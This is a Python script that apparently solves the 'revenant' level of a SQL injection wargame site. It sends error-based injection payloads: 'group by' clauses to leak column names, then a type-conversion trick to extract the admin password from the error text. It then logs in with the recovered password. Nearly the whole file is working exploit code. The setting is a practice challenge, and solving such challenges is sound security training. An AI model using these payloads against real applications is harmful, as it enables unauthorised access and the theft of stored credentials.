import requests
import os
import re

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/revenant_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}


columns = ['id', 'pw']

while True:
    res = requests.get(url, params={'id': 'admin', 'pw': f'\' group by {",".join(columns)} --'},cookies=cookie)
    col = re.findall(r'\'prob_revenant\.(.+)\'', res.text)[0]
    columns.append(col)
    
    if len(columns) == 5:
        break

print(f'columns: {columns}')
res = requests.get(url, params={'id': 'admin', 'pw': '\' or id=\'admin\' and "pw"=1 --'},cookies=cookie)
pw = re.findall(r'varchar value \'(.+)\'', res.text)[0]
print(f'pw: {pw}')

res = requests.get(url, params={'id': 'admin', 'pw': pw},cookies=cookie)
if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
